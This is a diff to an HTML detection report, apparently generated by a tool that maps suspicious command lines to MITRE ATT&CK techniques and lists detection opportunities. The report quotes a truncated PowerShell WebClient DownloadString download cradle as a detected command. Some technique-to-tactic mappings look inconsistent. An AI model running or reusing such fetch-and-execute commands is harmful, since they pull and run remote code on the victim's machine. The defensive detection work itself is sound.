@@ -376,7 +376,7 @@
                     </div>
                     <div class="meta-item">
                         <div class="meta-label">Duration</div>
-                        <div class="meta-value">0.04s</div>
+                        <div class="meta-value">0.036s</div>
                     </div>
                 </div>
             </div>
@@ -399,7 +399,7 @@
                         </div>
                     </div>
 
-                    <div class="timeline-item">
+                    <div class="timeline-item high-risk">
                         <div class="timeline-content">
                             <div class="timeline-title">Command #3: 5 detection(s)</div>
                             <div class="timeline-desc">powershell -c "(New-Object Net.WebClient).DownloadString('http://example.com/too...</div>
@@ -416,14 +416,40 @@
                         <th>Technique ID</th>
                         <th>Name</th>
                         <th>Detections</th>
-                        <th>Commands</th>
+                        <th>Unique Commands</th>
+                        <th>Command IDs</th>
                     </tr>
 
                     <tr>
-                        <td><strong></strong></td>
-                        <td>Unknown</td>
-                        <td>6</td>
-                        <td>2, 3, 3, 3, 3, 3</td>
+                        <td><strong>T1059.001</strong></td>
+                        <td>PowerShell</td>
+                        <td>2</td>
+                        <td>1</td>
+                        <td>3</td>
+                    </tr>
+
+                    <tr>
+                        <td><strong>T1071.001</strong></td>
+                        <td>T1071.001</td>
+                        <td>2</td>
+                        <td>1</td>
+                        <td>3</td>
+                    </tr>
+
+                    <tr>
+                        <td><strong>T1105</strong></td>
+                        <td>T1105</td>
+                        <td>1</td>
+                        <td>1</td>
+                        <td>3</td>
+                    </tr>
+
+                    <tr>
+                        <td><strong>T1218.011</strong></td>
+                        <td>System Binary Proxy Execution</td>
+                        <td>1</td>
+                        <td>1</td>
+                        <td>2</td>
                     </tr>
 
                 </table>
@@ -449,9 +475,17 @@
                     <div style="margin-top: 15px;">
                         <strong style="color: #667eea;">1 Technique(s) Detected:</strong>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1218.011</strong> - System Binary Proxy Execution
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Defense Evasion | <strong>Confidence:</strong> 50.0% | <strong>Behavior:</strong> Suspicious behavior
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Monitor for unusual process patterns
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Process execution logs
+                            </div>
                         </div>
 
                     </div>
@@ -466,29 +500,69 @@
                     <div style="margin-top: 15px;">
                         <strong style="color: #667eea;">5 Technique(s) Detected:</strong>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1059.001</strong> - PowerShell
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Execution | <strong>Confidence:</strong> 69.0% | <strong>Behavior:</strong> PowerShell download cradle
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Unexpected network connections from PowerShell, WebClient usage
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Sysmon Event ID 1, Sysmon Event ID 3 (Network)
+                            </div>
                         </div>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1059.001</strong> - PowerShell
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Execution | <strong>Confidence:</strong> 75.0% | <strong>Behavior:</strong> PowerShell DownloadString method via New-Object
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Monitor for unusual process patterns, Check parent-child process relationships
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Bash audit logs, Linux process accounting, PowerShell operational logs, Sysmon Event ID 1, Sysmon Event ID 3 (Network Connection)
+                            </div>
                         </div>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1105</strong> - T1105
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Defense Evasion | <strong>Confidence:</strong> 87.0% | <strong>Behavior:</strong> PowerShell WebClient DownloadString to fetch remote scripts
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Monitor network connections from PowerShell, Enable Script Block Logging, Check for download + execute patterns
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Sysmon Event ID 1, Sysmon Event ID 3, PowerShell Script Block Logging
+                            </div>
                         </div>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1071.001</strong> - T1071.001
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Defense Evasion | <strong>Confidence:</strong> 68.0% | <strong>Behavior:</strong> HTTP/HTTPS URL present in command line indicating network communication
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Extract and analyze URLs, Check domain reputation, Monitor for beaconing patterns
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Sysmon Event ID 1, Sysmon Event ID 3, Proxy logs, DNS logs
+                            </div>
                         </div>
 
-                        <div style="margin-top: 10px; padding: 10px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
-                            <strong>?</strong> - ?
-                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">N/A</div>
+                        <div style="margin-top: 10px; padding: 15px; background: white; border-left: 3px solid #667eea; border-radius: 3px;">
+                            <strong>T1071.001</strong> - T1071.001
+                            <div style="font-size: 0.85em; color: #718096; margin-top: 5px;">
+                                <strong>Tactic:</strong> Defense Evasion | <strong>Confidence:</strong> 69.0% | <strong>Behavior:</strong> PowerShell WebClient object creation for network communication
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 8px; padding-top: 8px; border-top: 1px solid #e2e8f0;">
+                                <strong>Detection Opportunities:</strong> Monitor WebClient instantiation, Check subsequent method calls, Inspect network connections
+                            </div>
+                            <div style="font-size: 0.8em; color: #718096; margin-top: 5px;">
+                                <strong>Telemetry Sources:</strong> Sysmon Event ID 1, Sysmon Event ID 3, PowerShell Script Block Logging
+                            </div>
                         </div>
 
                     </div>
@@ -498,7 +572,7 @@
             </div>
         </div>
         <div class="footer">
-            <p>Generated on 2026-03-05 00:29:15 UTC | OD-translator Phase 4 Report</p>
+            <p>Generated on 2026-03-05 02:30:05 UTC | OD-translator Phase 4 Report</p>
         </div>
     </div>
     <script>
